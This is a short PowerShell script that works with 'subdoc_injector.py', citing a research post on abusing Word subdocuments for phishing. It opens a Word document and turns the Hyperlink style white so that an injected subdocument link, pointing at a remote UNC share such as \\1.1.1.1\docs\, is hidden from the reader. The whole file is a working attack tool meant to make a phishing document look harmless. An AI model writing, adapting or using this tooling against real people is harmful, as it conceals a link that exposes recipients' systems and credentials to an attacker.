param(
   [string]$a,
   [string]$b
)
if ($a -eq "" -And $b -eq "") {
	Write-host "This script is to be used with 'subdoc_injector.py' as mentioned in https://rhinosecuritylabs.com/research/abusing-microsoft-word-features-phishing-subdoc/. The script will change the color of Subdoc reference link to 'white' and saves it`r`n"
	Write-Host "Please provide the path to the docx file"
	Write-Host "Please provide the URL path used in subdoc_injector.py"
	Write-Host "`r`nExample: .\test.ps1 z:\tmp\test.docx \\1.1.1.1\docs\"
	exit
} else {
	if ($a -eq "") {
		Write-Host "Please provide the path to the docx file"
		exit
	}
	if ($b -eq "") {
		Write-Host "Please provide the URL path used in subdoc_injector.py"
		exit
	}
}
#$saveFormatDoc = [Enum]::Parse([Microsoft.Office.Interop.Word.WdSaveFormat], "wdFormatDocument");

$Word = New-Object -ComObject Word.Application
$Word.Visible = $True
$Document = $Word.Documents.Open($a)
$FindText = $b
$Document.Styles | ForEach-Object {
	if ($_.NameLocal -eq "Hyperlink") {
		$_.NameLocal
		$_.Font.Color
		$_.Font.Color = 'wdColorWhite'
	}
}
#$Document.Paragraphs | ForEach-Object {
#    if ($_.Range.Text.Trim() -eq $FindText)
#    { 
#	$var = $_.Range.Style | Select-Object LinkStyle | ft -hidetableheaders
#	$var = $var | out-string
#	if ($var.Trim() -eq "System.__ComObject"){
#		Write-Output "Found Com Object - Changing Color of Text to White"
#		$_.Range.Font.Color = 'wdColorWhite'
#	}
#    }
#}
$Document.Save()
#$Document.SaveAs($a,[ref]$saveFormat)
$Document.Close()
$Word.Quit()